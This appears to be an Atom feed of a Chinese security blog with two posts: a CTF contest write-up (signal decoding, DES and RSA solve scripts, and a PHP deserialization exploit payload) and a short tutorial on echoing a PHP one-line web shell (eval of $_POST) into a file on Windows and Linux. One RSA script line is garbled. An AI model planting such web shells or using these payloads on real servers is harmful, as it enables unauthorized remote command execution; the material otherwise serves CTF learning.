<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robot&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-26T03:13:59.703Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Robot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛writerup</title>
    <link href="http://yoursite.com/2019/04/22/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/04/22/第十二届全国大学生信息安全竞赛/</id>
    <published>2019-04-21T17:59:24.000Z</published>
    <updated>2018-11-26T03:13:59.703Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><a id="more"></a><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件，用笔记本打开，然后摆几个post就出flag了。</p><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;87e37d95-6a48-4463-aff8-b0dbd27d3b7d&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-saleae"><a href="#0x02-saleae" class="headerlink" title="0x02 saleae"></a>0x02 saleae</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开文件，打开后发现4个channel是spi的，没用过这个软件，对着手册一顿下操作，然后根据channel改了一下参数，发现flag在解码协议里：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/1.jpg" alt="image"></p><h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03 24c"></a>0x03 24c</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开，本以为是I2C协议，其实不然，解码协议中有flag信息，后来发现发现ac有重写，穷举了一下：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/2.jpg" alt="image"></p><p>将第一段flag和第二段拼接得到flag。</p><h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-part-des"><a href="#0x04-part-des" class="headerlink" title="0x04 part_des"></a>0x04 part_des</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>google了一下，找到大佬实现的DES，与本题主体类似，套用改了一下，由于脚本过长，贴出主要代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">def run(self, key, text, action=ENCRYPT, padding=False):</span><br><span class="line">        if len(key) &lt; 8:</span><br><span class="line">            raise &quot;Key Should be 8 bytes long&quot;</span><br><span class="line">        elif len(key) &gt; 8:</span><br><span class="line">            key = key[:8] #If key size is above 8bytes, cut to be 8bytes long</span><br><span class="line"></span><br><span class="line">        self.password = key</span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line">        if padding and action==ENCRYPT:</span><br><span class="line">            self.addPadding()</span><br><span class="line">        elif len(self.text) % 8 != 0:#If not padding specified data size must be multiple of 8 bytes</span><br><span class="line">            raise &quot;Data size should be multiple of 8&quot;</span><br><span class="line"></span><br><span class="line">        self.generatekeys() #Generate all the keys</span><br><span class="line">        text_blocks = nsplit(self.text, 8) #Split the text in blocks of 8 bytes so 64 bits</span><br><span class="line">        result = list()</span><br><span class="line">        for block in text_blocks:#Loop over all the blocks of data</span><br><span class="line">            print block</span><br><span class="line">            block = string_to_bit_array(block)#Convert the block in bit array</span><br><span class="line">            block = self.permut(block,PI)#Apply the initial permutation</span><br><span class="line">            g, d = nsplit(block, 32) #g(LEFT), d(RIGHT)</span><br><span class="line">            tmp = None</span><br><span class="line">            for i in range(16): #Do the 16 rounds</span><br><span class="line">                d_e = self.expand(d, E)</span><br><span class="line">                if action == ENCRYPT:</span><br><span class="line">                    tmp = self.xor(self.keys[i], d_e)#If encrypt use Ki</span><br><span class="line">                else:</span><br><span class="line">                    tmp = self.xor(self.keys[15-i], d_e)#If decrypt start by the last key</span><br><span class="line">                tmp = self.substitute(tmp)</span><br><span class="line">                tmp = self.permut(tmp, P)</span><br><span class="line">                tmp = self.xor(g, tmp)</span><br><span class="line">                g = d</span><br><span class="line">                d = tmp</span><br><span class="line">            result += self.permut(d+g, PI_1) #Do the last permut and append the result to result</span><br><span class="line">        final_res = bit_array_to_string(result)</span><br><span class="line">        if padding and action==DECRYPT:</span><br><span class="line">            return self.removePadding(final_res) #Remove the padding if decrypt and padding is true</span><br><span class="line">        else:</span><br><span class="line">            return final_res #Return the final string of data ciphered/deciphered</span><br></pre></td></tr></table></figure><p>根据上面的思路，改成我们要的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def run(self, aRound):</span><br><span class="line">       part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       keymap = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       tkey = []</span><br><span class="line">       for i in range(16):</span><br><span class="line">           tmp = keymap[6*i: 6+6*i]</span><br><span class="line">           tkey.append(string_to_bit_array(tmp))</span><br><span class="line">       self.keys = tkey</span><br><span class="line">       result = list()</span><br><span class="line"></span><br><span class="line">       block = string_to_bit_array(part_encode)</span><br><span class="line">       </span><br><span class="line">       d, g = nsplit(block, 32) </span><br><span class="line">       tmp = None</span><br><span class="line">       for i in range(16): </span><br><span class="line">           if i &lt; aRound:</span><br><span class="line">               continue</span><br><span class="line">           d_e = self.expand(d, E)</span><br><span class="line">           tmp = self.xor(self.keys[15-i], d_e)</span><br><span class="line">           tmp = self.substitute(tmp)</span><br><span class="line">           tmp = self.permut(tmp, P)</span><br><span class="line">           tmp = self.xor(g, tmp)</span><br><span class="line">           g = d</span><br><span class="line">           d = tmp</span><br><span class="line">       result += self.permut(d+g, PI_1)</span><br><span class="line">       final_res = bit_array_to_string(result)</span><br><span class="line">       return final_res</span><br></pre></td></tr></table></figure><p>本题其实的考点就是把没解密完的 DES 继续解密。</p><h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0ur9Ood&#125;</span><br></pre></td></tr></table></figure><h3 id="0x05-Asymmetric"><a href="#0x05-Asymmetric" class="headerlink" title="0x05 Asymmetric"></a>0x05 Asymmetric</h3><h3 id="操作过程："><a href="#操作过程：" class="headerlink" title="操作过程："></a>操作过程：</h3><p>加密的n的公匙是pr,直接贴出脚本吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2,codecs,base64</span><br><span class="line"></span><br><span class="line">e=long(58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979)</span><br><span class="line">n=longspan><br><span class="line">t=long(165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867)</span><br><span class="line">p=long(t**2)</span><br><span class="line">q=long(t**2)</span><br><span class="line"></span><br><span class="line">d=long(gmpy2.invert(e,p**2*(p-1)))#;print d</span><br><span class="line">c=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&quot;</span><br><span class="line">c=base64.b64decode(c)</span><br><span class="line">c=c.encode(&apos;hex&apos;)#;print c</span><br><span class="line">c=int(c,16)</span><br><span class="line">m=hex(pow(c,d,n))[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">if(len(m)%2==1):</span><br><span class="line">    m=&apos;0&apos;+m</span><br><span class="line">print m.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><p>解这题用到了欧拉定理，得到m的值之后解码就得到了flag。</p><h3 id="flag的值："><a href="#flag的值：" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ec33f669d2d659e2bc27dbffdfeb0f38&#125;</span><br></pre></td></tr></table></figure><h3 id="0x06-JustSoso"><a href="#0x06-JustSoso" class="headerlink" title="0x06 JustSoso"></a>0x06 JustSoso</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源代码，发现index.php?file=xxx.php及hint，用伪协议读?file=php://filter/convert.base64-encode/resource=hint.php和index.php，解码后得到源码。<br>hint.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/3.png" alt="image"></p><p>index.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/4.png" alt="image"></p><p>从源码可以看出反序列化漏洞，解析漏洞过parse_url；链条用Handle和Flag；将__wake_up的数目改大，即可绕过二次赋值；unserilize是私有函数，用%00代替<0x00>，最终payload为：</0x00></p><p>///index.php?file=hint.php&amp;payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;N;s:10:”token_flag”;R:4;}}</p><h3 id="flag的值：-1"><a href="#flag的值：-1" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa9b19d3-d437-4668-99c3-d0a8c888633f&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-签到题&quot;&gt;&lt;a href=&quot;#0x01-签到题&quot; class=&quot;headerlink&quot; title=&quot;0x01 签到题&quot;&gt;&lt;/a&gt;0x01 签到题&lt;/h3&gt;
    
    </summary>
    
    
      <category term="ctf相关" scheme="http://yoursite.com/tags/ctf%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>echo写马的小技巧</title>
    <link href="http://yoursite.com/2018/11/26/echo%E5%86%99%E9%A9%AC%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2018/11/26/echo写马的小技巧/</id>
    <published>2018-11-26T02:29:22.000Z</published>
    <updated>2018-11-26T03:18:20.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-首先给一个错误的写马方式"><a href="#0x00-首先给一个错误的写马方式" class="headerlink" title="0x00:首先给一个错误的写马方式"></a>0x00:首先给一个错误的写马方式</h2><a id="more"></a><h3 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01:Windows"></a>0x01:Windows</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errorma.png" alt=""></p><p>你会发现文件里面多了双引号.</p><h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02:Linux"></a>0x02:Linux</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errormalinux.png" alt=""></p><p>$_POST无故消失.</p><h2 id="0x10-正确的写马方式"><a href="#0x10-正确的写马方式" class="headerlink" title="0x10:正确的写马方式"></a>0x10:正确的写马方式</h2><h3 id="0x11-Windows"><a href="#0x11-Windows" class="headerlink" title="0x11:Windows"></a>0x11:Windows</h3><p><code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; 1.php</code></p><p>在尖括号前面加^这个符号.</p><p><img src="/2018/11/26/echo写马的小技巧/rightma.png" alt=""></p><h3 id="0x12-Linux"><a href="#0x12-Linux" class="headerlink" title="0x12:Linux"></a>0x12:Linux</h3><p><code>echo &quot;&lt;?php @eval(\$_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p>在$符前加斜杠.</p><p><img src="/2018/11/26/echo写马的小技巧/rightmalinux.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-首先给一个错误的写马方式&quot;&gt;&lt;a href=&quot;#0x00-首先给一个错误的写马方式&quot; class=&quot;headerlink&quot; title=&quot;0x00:首先给一个错误的写马方式&quot;&gt;&lt;/a&gt;0x00:首先给一个错误的写马方式&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
